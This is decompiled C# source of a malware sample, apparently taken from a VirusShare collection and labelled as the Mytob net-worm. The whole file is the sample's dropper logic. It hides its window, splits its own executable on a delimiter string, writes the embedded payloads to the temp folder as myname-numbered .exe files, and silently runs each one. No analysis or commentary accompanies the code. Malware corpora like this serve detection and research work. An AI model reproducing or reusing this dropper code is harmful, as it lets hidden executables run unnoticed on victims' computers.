// Decompiled with JetBrains decompiler
// Type: .
// Assembly: first, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B5A227B3-A3DF-4D24-8B17-22E26759729B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Net-Worm.Win32.Mytob.lcl-f71c22548880c3bb527b09d56e5d4f7175f453be656615a3472121e74d5c3621.exe

using \u0010;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace \u0010
{
  [DesignerGenerated]
  internal class \u000F : Form
  {
    private IContainer \u0001;
    private const string \u0002 = "}RBrCQOhT~dagi7em8S";
    private int \u0003;

    public \u000F()
    {
      \u000F obj = this;
      // ISSUE: virtual method pointer
      this.Load += new EventHandler((object) obj, __vmethodptr(obj, \u0081));
      this.\u0003 = 1;
      this.\u0080();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0080()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = "Form1";
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Form1";
      this.ResumeLayout(false);
    }

    private void \u0081(object sender, EventArgs e)
    {
      try
      {
        string tempPath = Path.GetTempPath();
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        string Expression = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref Expression);
        FileSystem.FileClose(1);
        string[] source = Microsoft.VisualBasic.Strings.Split(Expression, "}RBrCQOhT~dagi7em8S");
        Conversions.ToString(((IEnumerable<string>) source).Count<string>());
        int num1 = ((IEnumerable<string>) source).Count<string>();
        int num2 = 0;
        while (num2 <= num1)
        {
          FileSystem.FileOpen(3, tempPath + "\\myname" + Conversions.ToString(this.\u0003) + ".exe", OpenMode.Binary, OpenAccess.ReadWrite);
          FileSystem.FilePut(3, source[this.\u0003], -1L, false);
          FileSystem.FileClose(3);
          Process.Start(tempPath + "\\myname" + Conversions.ToString(this.\u0003) + ".exe");
          checked { ++this.\u0003; }
          checked { ++num2; }
        }
        this.Close();
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Close();
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
      this.Close();
      ProjectData.EndApp();
    }
  }
}
